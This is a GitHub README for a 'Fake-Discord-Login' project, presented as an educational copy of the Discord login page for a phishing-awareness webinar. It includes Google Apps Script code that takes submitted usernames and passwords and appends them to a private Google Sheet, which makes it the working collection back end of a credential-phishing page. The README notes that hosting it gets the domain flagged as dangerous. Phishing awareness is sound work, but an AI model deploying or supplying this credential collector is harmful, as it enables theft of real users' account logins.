# Fake-Discord-Login
An educational extract of the Discord login page, edited slightly to warn people of phishing.  
This repository is a commission for an educational webinar.  
Input sent through the "login form" is sent to a Google Sheet. This Google Sheet is private to avoid trolling.  
  
It also has taught me a lot about data storage and usage on a static webpage as well as how bad Google App Script error messages are.  
This approach to data storage allows me to read and write data to and from a "database" (Google Sheet) fairly dynamically on a static site.  
I don't think this is realistic for any sort of production mostly due to the sheer amount of requests this would take to operate a database.  

**Hosting this repository to GitHub Pages will make Microsoft, Google and possibly others flag your github.io domain as dangerous.**

# Google Script
```js
function doPost(e) {
  return handleRequest(e, "POST");
}

function doGet(e) {
  return handleRequest(e, "GET")
}

function doOptions(e) {
  return handleRequest(e, "OPTIONS");
}

function handleRequest(e, method) {
  if (method === "POST") {
    // Handle POST requests
    var sheet = SpreadsheetApp.openById('FILE_ID').getSheetByName('SHEET_NAME');
    var data = JSON.parse(e.postData.contents);
    // Append the data to the sheet
    sheet.appendRow([data.username, data.password]);
  }

  return ContentService.createTextOutput(JSON.stringify({
      "status": "success"
    }));
}
```
